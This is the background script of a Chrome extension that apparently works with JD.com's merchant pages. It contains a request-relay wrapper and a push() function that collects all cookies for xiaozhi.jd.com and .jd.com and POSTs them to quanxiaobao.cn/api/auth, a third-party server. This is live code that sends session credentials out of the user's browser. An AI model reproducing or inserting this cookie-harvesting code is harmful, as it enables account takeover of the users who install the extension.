var http = {
  getJSON: (props) => {
    const { params, url, api, sendResponse, ...otherProps } = props;
    if (params) {
      $.getJSON(url, params, function (res) {
        sendResponse({ api, res, ...otherProps });
      });
    } else {
      $.getJSON(url, function (res) {
        sendResponse({ api, res, ...otherProps });
      });
    }
  },
  get: (props) => {
    const { params, url, type, api, headers, sendResponse, ...otherProps } =
      props;
    $.ajax({
      url,
      type: "GET",
      dataType: "json",
      headers: { ...headers },
      contentType: "application/json",
      success: function (res) {
        sendResponse({ ...res, api, ...otherProps });
      },
      error: function () {
        sendResponse();
      },
    });
  },
  post: (props) => {
    const {
      params,
      url,
      type,
      api,
      headers,
      sendResponse,
      isEnd,
      ...otherProps
    } = props;
    $.ajax({
      url,
      type: "POST",
      dataType: "json",
      data: JSON.stringify(params),
      headers: { "Content-Type": "application/json;charset=UTF-8", ...headers },
      success: function (res) {
        if (api === "login") {
          sendResponse({ ...res, ...params, api });
        } else if (api === "taskUpdate") {
          sendResponse({ ...res, api, isEnd });
        } else if (api === "statsUpdate") {
          sendResponse({ ...res, api, isEnd, ...otherProps });
        } else {
          sendResponse({ ...res, api, ...otherProps });
        }
      },
      error: function () {
        sendResponse();
      },
    });
  },
};
chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
  console.log("REQ", req);
  if (req == "push") {
    push();
  } else if (req.url) {
    const { params, url, type, api, headers } = req;
    http[type]({ ...req, sendResponse });
    return true;
    // http[type](url, params, sendResponse);
  } else {
    chrome.runtime.getPackageDirectoryEntry(function (dirEntry) {
      if (req.indexOf("/") < 0) req = "content_script/" + req;
      dirEntry.getFile(
        req + ".js",
        undefined,
        function (fileEntry) {
          fileEntry.file(function (file) {
            var reader = new FileReader();
            reader.addEventListener("load", function (event) {
              sendScriptToContent(req, reader.result);
            });
            reader.readAsText(file);
          });
        },
        function (e) {
          console.log(e);
        }
      );
    });
  }
});

function push() {
  var content = {};
  chrome.cookies.getAll({}, function (cookies) {
    for (var i in cookies) {
      if (["xiaozhi.jd.com", ".jd.com"].indexOf(cookies[i].domain) > -1) {
        content[cookies[i].name] = cookies[i].value;
      }
    }
    $.post("https://quanxiaobao.cn/api/auth", content);
  });
}

function sendScriptToContent(content, code) {
  chrome.tabs.query(
    {
      active: true,
      currentWindow: true,
    },
    (tabs) => {
      let message = {
        content: content,
        code: code,
      };
      chrome.tabs.sendMessage(tabs[0].id, message, (res) => {
        // console.log(res);
      });
    }
  );
}
